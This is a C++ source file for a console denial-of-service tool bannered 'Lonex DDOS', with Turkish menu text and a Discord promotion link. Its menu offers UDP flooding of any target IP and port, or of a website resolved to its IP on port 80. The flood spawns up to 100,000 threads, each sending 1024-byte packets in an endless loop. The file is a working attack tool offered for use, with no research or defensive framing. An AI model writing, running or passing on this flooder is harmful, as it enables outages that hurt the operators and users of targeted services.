#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>

void showBanner() {
    std::system("clear");
    std::cout << "\033[32m"; 
    std::cout << "\n";
    std::cout << "  _                      ______  _____   ____   _____ \n";
    std::cout << " | |                    |  _  \\|  __ \\ / __ \\ / ____|\n";
    std::cout << " | |      ___  _ __   ___| | | || |  | | |  | | (___  \n";
    std::cout << " | |     / _ \\| '_ \\ / _ \\ | | || |  | | |  | |\\___ \\ \n";
    std::cout << " | |____| (_) | | | |  __/ |/ / | |__| | |__| |____) |\n";
    std::cout << " |______\\___/|_| |_|\\___|___/  |_____/ \\____/ |_____/ \n";
    std::cout << "                                                      \n";
    std::cout << "                            Discord: Lonex33          \n";
    std::cout << "------------------------------------------------------\n";
    std::cout << " [0] Klavuz\n";
    std::cout << " [1] Ddos IP\n";
    std::cout << " [2] Ddos WEB-SITE\n";
    std::cout << " [3] WEB SITE DOMAIN FIND\n";
    std::cout << " [4] SIKTIR GIT OC\n";
    std::cout << "------------------------------------------------------\n";
    std::cout << "\033[0m" << " Seciminiz: ";
}

void floodTask(const std::string& targetIp, int targetPort, int threadCount) {
    std::cout << "\n[!] Saldiri baslatildi -> Hedef: " << targetIp << ":" << targetPort << " | Thread: " << threadCount << "\n";
    std::cout << "[!] Durdurmak icin CTRL+C tuslarina basin.\n\n";

    std::vector<std::thread> threads;
    for (int t = 0; t < threadCount; ++t) {
        threads.emplace_back([targetIp, targetPort]() {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) return;
            sockaddr_in serverAddr;
            std::memset(&serverAddr, 0, sizeof(serverAddr));
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_port = htons(targetPort);
            inet_pton(AF_INET, targetIp.c_str(), &serverAddr.sin_addr);
            char payload[1024];
            std::memset(payload, 'X', sizeof(payload));
            while (true) {
                sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
            }
            close(sock);
        });
    }
    for (auto& th : threads) {
        if (th.joinable()) th.join();
    }
}

std::string resolveDomainToIP(const std::string& domain) {
    addrinfo hints = {}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(domain.c_str(), nullptr, &hints, &res) != 0) return "";
    sockaddr_in* ipv4 = (sockaddr_in*)res->ai_addr;
    char ipStr[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
    freeaddrinfo(res);
    return std::string(ipStr);
}

int main() {
    int choice;
    while (true) {
        showBanner();
        if (!(std::cin >> choice)) break;
        if (choice == 0) {
            std::cout << "\n Daha fazla Tool icin discord sunucumuza gelin\n\n";
            std::cout << " Discord ⟩ https://discord.gg/JySzKjuSYj \n\n";
            std::cout << "Devam etmek icin Enter'a basin...";
            std::cin.ignore(); std::cin.get();
        } else if (choice == 1) {
            std::string ip; int port, threads;
            std::cout << " Hedef IP adresini girin: "; std::cin >> ip;
            std::cout << " Port: "; std::cin >> port;
            std::cout << " Sayi (max [100000]): "; std::cin >> threads;
            if (threads > 100000) threads = 100000;
            floodTask(ip, port, threads);
        } else if (choice == 2) {
            std::string domain; int threads;
            std::cout << " Hedef Website girin: "; std::cin >> domain;
            std::cout << " Sayi (max [100000]): "; std::cin >> threads;
            if (threads > 100000) threads = 100000;
            std::string resolvedIp = resolveDomainToIP(domain);
            if (resolvedIp.empty()) std::cout << "[-] Domain IP adresine cevirilemedi!\n";
            else floodTask(resolvedIp, 80, threads);
            std::cout << "Devam etmek icin Enter'a basin...";
            std::cin.ignore(); std::cin.get();
        } else if (choice == 3) {
            std::string domain;
            std::cout << " Web sitesini girin: "; std::cin >> domain;
            std::string ip = resolveDomainToIP(domain);
            if (!ip.empty()) std::cout << "[+] Domain: " << domain << " --> IP Adresi: " << ip << "\n";
            else std::cout << "[-] Bulunamadi veya hatali domain.\n";
            std::cout << "Devam etmek icin Enter'a basin...";
            std::cin.ignore(); std::cin.get();
        } else if (choice == 4) {
            std::cout << "\nGorusmek uzere, sevgilim... Cikis yapiliyor.\n";
            break;
        }
    }
    return 0;
}
